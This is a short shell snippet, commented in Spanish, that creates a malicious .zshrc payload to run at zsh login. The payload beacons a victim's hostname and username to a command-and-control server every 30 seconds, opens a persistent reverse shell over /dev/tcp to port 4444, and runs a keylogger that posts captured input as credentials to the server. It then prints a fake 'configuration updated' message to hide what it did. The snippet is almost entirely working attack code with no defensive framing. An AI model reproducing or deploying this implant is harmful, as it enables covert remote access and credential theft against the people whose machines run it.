# En tu Linux VM, crea el payload
cat > malicious.zshrc << 'EOF'
#!/bin/zsh
# .zshrc malicioso - Se ejecuta al login de zsh

# Reemplaza con tu IP del PC (Express Server)
C2_IP="TU_IP_PC_AQUI"  # Cambiar por IP de tu PC

# Beacon silencioso cada 30s
beacon() {
    curl -s "http://${C2_IP}:5000/beacon?ip=$(hostname -I)&user=$USER" > /dev/null 2>&1
}

# Reverse shell persistente
revshell() {
    bash -i >& /dev/tcp/${C2_IP}/4444 0>&1 &
}

# Keylogger simple
keylog() {
    while true; do
        read -r -s -t 1 line
        [ -n "$line" ] && echo "$(date): $line" >> ~/.keylog
        curl -s -X POST "http://${C2_IP}:5000/login" \
             -H "Content-Type: application/json" \
             -d "{\"usuario\":\"$USER\",\"clave\":\"KEYLOG: $line\"}" > /dev/null 2>&1
    done
}

# Ejecutar todo en background
(beacon; sleep 30; while true; do beacon; sleep 30; done) &
(revshell) &
(keylog) &

echo "Configuración zsh actualizada ✓"
EOF

chmod +x malicious.zshrc